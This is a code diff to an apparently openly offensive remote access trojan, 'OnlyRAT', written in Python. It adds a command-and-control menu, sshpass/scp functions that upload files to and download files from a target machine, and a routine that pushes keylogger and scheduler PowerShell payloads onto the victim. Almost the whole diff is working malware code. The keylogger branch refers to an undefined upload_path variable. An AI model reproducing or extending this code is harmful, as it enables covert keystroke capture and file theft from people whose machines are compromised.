@@ -4,6 +4,9 @@
 import os
 import sys
 import getpass
+import string
+import secrets as s
+import random as r
 
 banner = r"""
   /$$$$$$            /$$           /$$$$$$$   /$$$$$$  /$$$$$$$$
@@ -36,8 +39,11 @@ help_menu = """
 """
 
 options_menu = """
-            [+] commands:
+            [+] command and control:
                 [0] Remote Console
+                [1] Keylogger
+                [2] remote download
+                [3] remote upload
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -51,6 +57,9 @@ options_menu = """
 
 username = getpass.getuser()
 header = f"[~] {username}@onlyrat $ "
+remote_path = "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads"
+local_path = f"/home/{username}/.0nlyRAT" if username!="root" else "/root/.0nlyRAT"
+
 IP_KEY = "IPADDRESS"
 PASS_KEY = "PASSWORD"
 WORKINGDIR_KEY = "WORKINGDIR"
@@ -63,8 +72,8 @@ def read_config(config_file):
     read_lines = open(config_file, "r").readlines()
     configuration[IP_KEY] = read_lines[0].strip()
     configuration[PASS_KEY] = read_lines[1].strip()
-    configuration[WORKINGDIR_KEY] = read_lines[2].strip()
-    configuration[STARTUPDIR_KEY] = read_lines[3].strip()
+    configuration[WORKINGDIR_KEY] = read_lines[2].replace("\\","/").strip()
+    configuration[STARTUPDIR_KEY] = read_lines[3].replace("\\","/").strip()
     return configuration
 
 # remotely connect RAT to target
@@ -83,6 +92,15 @@ def os_detection():
         return "w"
     if os.name == "posix":
         return "l"
+    
+def random_text():
+    return ''.join(s.choice(string.ascii_letters+string.digits) for _ in range(r.randint(8,17)))
+
+def remote_upload(ipv4,pword,file_path,upload_path):
+    os.system(f"sshpass -p \"{pword}\" scp {file_path} onlyrat@{ipv4}:{upload_path}")
+
+def remote_download(ipv4,pword,path_to_file,local_download_location):
+    os.system(f"sshpass -p \"{pword}\" scp onlyrat@{ipv4}:{path_to_file} {local_download_location}")
 
 def update():
     return
@@ -105,12 +123,21 @@ def cli(arguments):
             tgt_ipv4 = configuration.get(IP_KEY)
             tgt_pword = configuration.get(PASS_KEY)
             tgt_wd = configuration.get(WORKINGDIR_KEY)
+            tgt_sd = configuration.get(STARTUPDIR_KEY)
             print(options_menu)
             print("\t    [*] type \"help\" for help menu [*]\n")
             while True:
                 option = input(f"{header}")
                 if option == "0":
                     connect(tgt_ipv4,tgt_pword)
+                elif option == "1":
+                    controller = f"{local_path}/payloads/keylogger/controller.cmd"
+                    keylogger = f"{local_path}/payloads/keylogger/keylogger.ps1"
+                    scheduler = f"{local_path}/payloads/keylogger/scheduler.ps1"
+
+                    remote_upload(tgt_ipv4,tgt_pword,controller,upload_path) #controller
+                    remote_upload(tgt_ipv4,tgt_pword,keylogger,upload_path) #keylogger
+                    remote_upload(tgt_ipv4,tgt_pword,scheduler,upload_path) #scheduler
                 elif option == "help":
                     clear()
                     print(banner)
